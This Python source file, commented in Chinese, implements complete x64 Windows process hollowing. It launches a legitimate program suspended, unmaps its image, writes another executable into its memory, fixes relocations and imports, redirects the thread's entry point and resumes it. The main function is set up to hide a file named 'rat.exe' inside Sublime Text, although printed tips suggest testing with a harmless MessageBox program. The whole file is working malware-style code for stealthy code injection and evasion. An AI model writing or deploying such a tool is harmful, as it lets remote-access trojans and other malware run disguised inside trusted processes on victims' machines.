import ctypes
from ctypes import wintypes
import pefile
import struct
import sys

# Windows API 常量
CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

CONTEXT_FULL = 0x100007


class CONTEXT_X64(ctypes.Structure):
    _fields_ = [
        ("P1Home", ctypes.c_uint64),
        ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64),
        ("P6Home", ctypes.c_uint64),
        ("ContextFlags", ctypes.c_uint32),
        ("MxCsr", ctypes.c_uint32),
        ("SegCs", ctypes.c_uint16),
        ("SegDs", ctypes.c_uint16),
        ("SegEs", ctypes.c_uint16),
        ("SegFs", ctypes.c_uint16),
        ("SegGs", ctypes.c_uint16),
        ("SegSs", ctypes.c_uint16),
        ("EFlags", ctypes.c_uint32),
        ("Dr0", ctypes.c_uint64),
        ("Dr1", ctypes.c_uint64),
        ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64),
        ("Dr6", ctypes.c_uint64),
        ("Dr7", ctypes.c_uint64),
        ("Rax", ctypes.c_uint64),
        ("Rcx", ctypes.c_uint64),
        ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64),
        ("Rdi", ctypes.c_uint64),
        ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64),
        ("R10", ctypes.c_uint64),
        ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64),
        ("R13", ctypes.c_uint64),
        ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64),
        ("Rip", ctypes.c_uint64),
    ]


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


class ProcessHollower:
    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
        self._setup_api_types()

    def _setup_api_types(self):
        """设置核心API类型"""
        self.kernel32.CreateProcessW.argtypes = [
            wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
            wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
            ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION)
        ]
        self.kernel32.CreateProcessW.restype = wintypes.BOOL

        self.kernel32.VirtualAllocEx.argtypes = [
            wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD
        ]
        self.kernel32.VirtualAllocEx.restype = wintypes.LPVOID

        self.kernel32.WriteProcessMemory.argtypes = [
            wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t)
        ]
        self.kernel32.WriteProcessMemory.restype = wintypes.BOOL

        self.kernel32.ReadProcessMemory.argtypes = [
            wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t)
        ]
        self.kernel32.ReadProcessMemory.restype = wintypes.BOOL

        self.kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.POINTER(CONTEXT_X64)]
        self.kernel32.GetThreadContext.restype = wintypes.BOOL

        self.kernel32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.POINTER(CONTEXT_X64)]
        self.kernel32.SetThreadContext.restype = wintypes.BOOL

        self.kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
        self.kernel32.ResumeThread.restype = wintypes.DWORD

        self.kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
        self.kernel32.CloseHandle.restype = wintypes.BOOL

        self.kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
        self.kernel32.GetModuleHandleW.restype = wintypes.HMODULE

        self.kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        self.kernel32.GetProcAddress.restype = wintypes.LPVOID

        self.kernel32.LoadLibraryW.argtypes = [wintypes.LPCWSTR]
        self.kernel32.LoadLibraryW.restype = wintypes.HMODULE

        # NTDLL
        self.ntdll.NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
        self.ntdll.NtUnmapViewOfSection.restype = wintypes.LONG

    def write_memory(self, hProcess, address, data):
        """写入内存 - 强制使用 bytes"""
        if isinstance(address, int):
            addr_ptr = ctypes.c_void_p(address)
        else:
            addr_ptr = address

        # 强制转换为 bytes
        if isinstance(data, int):
            data = struct.pack('<Q', data)
        elif not isinstance(data, bytes):
            data = bytes(data)

        bytes_written = ctypes.c_size_t()
        result = self.kernel32.WriteProcessMemory(
            hProcess, addr_ptr, data, len(data), ctypes.byref(bytes_written)
        )
        return result and bytes_written.value == len(data)

    def read_memory(self, hProcess, address, size):
        """读取内存"""
        if isinstance(address, int):
            addr_ptr = ctypes.c_void_p(address)
        else:
            addr_ptr = address

        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t()

        result = self.kernel32.ReadProcessMemory(
            hProcess, addr_ptr, buffer, size, ctypes.byref(bytes_read)
        )

        if result and bytes_read.value == size:
            return buffer.raw
        return None

    def apply_relocations(self, hProcess, pe, new_base, old_base):
        """应用重定位 - 带安全检查"""
        if new_base == old_base:
            return True

        # 检查是否有重定位表
        if not hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'):
            print("    错误: PE 没有重定位表且基址不匹配")
            return False

        delta = new_base - old_base
        print(f"    应用重定位，Delta: 0x{delta:X}")

        for reloc in pe.DIRECTORY_ENTRY_BASERELOC:
            page_rva = reloc.struct.VirtualAddress

            for entry in reloc.entries:
                if entry.type == 10:  # IMAGE_REL_BASED_DIR64
                    rva = page_rva + entry.offset
                    addr = new_base + rva

                    data = self.read_memory(hProcess, addr, 8)
                    if data:
                        old_val = struct.unpack('<Q', data)[0]
                        new_val = old_val + delta
                        if not self.write_memory(hProcess, addr, struct.pack('<Q', new_val)):
                            print(f"    重定位失败 at RVA 0x{rva:X}")
                            return False
        return True

    def fix_iat_simple(self, hProcess, pe, image_base):
        """简化版 IAT 修复 - 强制使用 pack"""
        if not hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            return True

        print("    修复 IAT...")

        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode('utf-8')
            print(f"    DLL: {dll_name}")

            # 加载 DLL
            h_dll = self.kernel32.LoadLibraryW(dll_name)
            if not h_dll:
                print(f"    警告: 无法加载 {dll_name}")
                continue

            # 解析每个函数
            for imp in entry.imports:
                try:
                    if imp.name:
                        func_name = imp.name.encode('utf-8')
                        func_addr = self.kernel32.GetProcAddress(h_dll, func_name)
                    else:
                        func_addr = self.kernel32.GetProcAddress(h_dll, ctypes.c_void_p(imp.ordinal))

                    if func_addr:
                        iat_addr = image_base + imp.address
                        # 强制使用 pack 确保是 8 字节
                        self.write_memory(hProcess, iat_addr, struct.pack('<Q', func_addr))
                    else:
                        print(f"    警告: 无法解析函数 {imp.name if imp.name else f'ordinal {imp.ordinal}'}")
                except Exception as e:
                    print(f"    警告: 解析函数失败: {e}")
                    continue

        return True

    def hollow_process(self, source_exe, target_exe):
        """极简版进程空心化 - 最终稳定版"""

        print("\n[*] 开始进程空心化...")
        print(f"[*] 源程序: {source_exe}")
        print(f"[*] 目标程序: {target_exe}\n")

        # 1. 创建挂起进程
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()

        print("[1] 创建挂起进程...")
        success = self.kernel32.CreateProcessW(
            None, target_exe, None, None, False,
            CREATE_SUSPENDED, None, None,
            ctypes.byref(si), ctypes.byref(pi)
        )

        if not success:
            error = ctypes.get_last_error()
            return f"CreateProcessW 失败: {error}"

        print(f"    PID: {pi.dwProcessId}")

        # 2. 获取线程上下文
        context = CONTEXT_X64()
        context.ContextFlags = CONTEXT_FULL

        if not self.kernel32.GetThreadContext(pi.hThread, ctypes.byref(context)):
            error = ctypes.get_last_error()
            return f"GetThreadContext 失败: {error}"

        # 3. 读取 PEB 获取原 ImageBase
        peb_addr = context.Rdx
        original_base = ctypes.c_void_p()

        if not self.kernel32.ReadProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(peb_addr + 0x10),
                ctypes.byref(original_base),
                ctypes.sizeof(original_base),
                None
        ):
            error = ctypes.get_last_error()
            return f"读取 PEB 失败: {error}"

        print(f"[2] 原基址: 0x{original_base.value:X}")

        # 4. 解析源 PE
        try:
            pe = pefile.PE(source_exe)
            print(f"[3] 解析 PE 成功")
            print(f"    镜像基址: 0x{pe.OPTIONAL_HEADER.ImageBase:X}")
            print(f"    镜像大小: 0x{pe.OPTIONAL_HEADER.SizeOfImage:X}")
            print(f"    入口点 RVA: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:X}")

            # 检查是否有重定位表（如果基址会变）
            if pe.OPTIONAL_HEADER.ImageBase != original_base.value:
                if not hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'):
                    return "错误: PE 没有重定位表，无法在不同基址运行"
        except Exception as e:
            return f"解析 PE 失败: {e}"

        # 5. 卸载原映像
        if original_base.value:
            result = self.ntdll.NtUnmapViewOfSection(pi.hProcess, original_base)
            if result == 0:
                print(f"[4] 已卸载原映像")
            else:
                print(f"    警告: NtUnmapViewOfSection 返回 {result}")

        # 6. 分配新内存
        new_base = self.kernel32.VirtualAllocEx(
            pi.hProcess,
            ctypes.c_void_p(pe.OPTIONAL_HEADER.ImageBase),
            pe.OPTIONAL_HEADER.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )

        if not new_base:
            print(f"    首选基址不可用，尝试自动分配...")
            new_base = self.kernel32.VirtualAllocEx(
                pi.hProcess, None,
                pe.OPTIONAL_HEADER.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            if not new_base:
                error = ctypes.get_last_error()
                return f"VirtualAllocEx 失败: {error}"

        new_base_int = new_base if isinstance(new_base, int) else new_base.value
        print(f"[5] 分配新内存: 0x{new_base_int:X}")

        # 7. 写入 PE 数据
        with open(source_exe, 'rb') as f:
            pe_data = f.read()

        # 写入头
        if not self.write_memory(pi.hProcess, new_base_int, pe_data[:pe.OPTIONAL_HEADER.SizeOfHeaders]):
            return "写入 PE 头失败"

        # 写入节
        print("[6] 写入 PE 节...")
        for section in pe.sections:
            if section.SizeOfRawData > 0:
                section_data = pe_data[section.PointerToRawData:section.PointerToRawData + section.SizeOfRawData]
                dest_addr = new_base_int + section.VirtualAddress
                section_name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
                if not self.write_memory(pi.hProcess, dest_addr, section_data):
                    return f"写入节 {section_name} 失败"
                print(f"    节 {section_name}: 0x{dest_addr:X}")

        # 8. 应用重定位
        print("[7] 应用重定位...")
        if not self.apply_relocations(pi.hProcess, pe, new_base_int, pe.OPTIONAL_HEADER.ImageBase):
            return "应用重定位失败"

        # 9. 修复 IAT
        print("[8] 修复 IAT...")
        if not self.fix_iat_simple(pi.hProcess, pe, new_base_int):
            print("    警告: IAT 修复可能不完全")

        # 10. 更新 PEB 中的 ImageBase
        new_base_ptr = ctypes.c_void_p(new_base_int)
        if not self.kernel32.WriteProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(peb_addr + 0x10),
                ctypes.byref(new_base_ptr),
                ctypes.sizeof(new_base_ptr),
                None
        ):
            return "更新 PEB ImageBase 失败"
        print(f"[9] PEB 基址已更新")

        # 11. 修改 RIP 指向新入口点
        entry_point = new_base_int + pe.OPTIONAL_HEADER.AddressOfEntryPoint
        context.Rip = entry_point
        context.ContextFlags = CONTEXT_FULL

        if not self.kernel32.SetThreadContext(pi.hThread, ctypes.byref(context)):
            error = ctypes.get_last_error()
            return f"SetThreadContext 失败: {error}"
        print(f"[10] RIP 已修改为入口点: 0x{entry_point:X}")

        # 12. 恢复线程
        print("[11] 恢复线程...")
        thread_id = self.kernel32.ResumeThread(pi.hThread)
        if thread_id == 0xFFFFFFFF:
            error = ctypes.get_last_error()
            return f"ResumeThread 失败: {error}"

        print(f"\n[+] 进程空心化完成！")
        print(f"[+] PID: {pi.dwProcessId}")
        print(f"[+] 基址: 0x{new_base_int:X}")
        print(f"[+] 入口点: 0x{entry_point:X}")

        # 关闭句柄
        self.kernel32.CloseHandle(pi.hThread)
        self.kernel32.CloseHandle(pi.hProcess)

        return "[+] 成功"


def main():
    # 建议：先用 notepad.exe 和简单 MessageBox 程序测试
    target = r'C:\Program Files\Sublime Text 3\sublime_text.exe'
    source = r'C:\Users\方良辰\Desktop\rat.exe'  # 简单 MessageBox 程序

    # 如果 test.exe 不存在，给出提示
    import os
    if not os.path.exists(source):
        print(f"警告: {source} 不存在")
        print("请先编译一个简单的 MessageBox 程序：")
        print("""
        #include <windows.h>
        int main() {
            MessageBoxA(0, "Hollowing Success!", "Test", 0);
            return 0;
        }
        """)
        return

    print("=" * 60)
    print("进程空心化 - 最终稳定版")
    print("=" * 60)
    print("\n建议测试环境:")
    print("  ✓ 目标: notepad.exe")
    print("  ✓ 源程序: 简单 MessageBox C程序")
    print("  ✓ 不要用复杂程序 (Sublime/RAT)")
    print("=" * 60)

    hollow = ProcessHollower()
    result = hollow.hollow_process(source, target)

    print("\n" + "=" * 60)
    print(result)
    print("=" * 60)


main()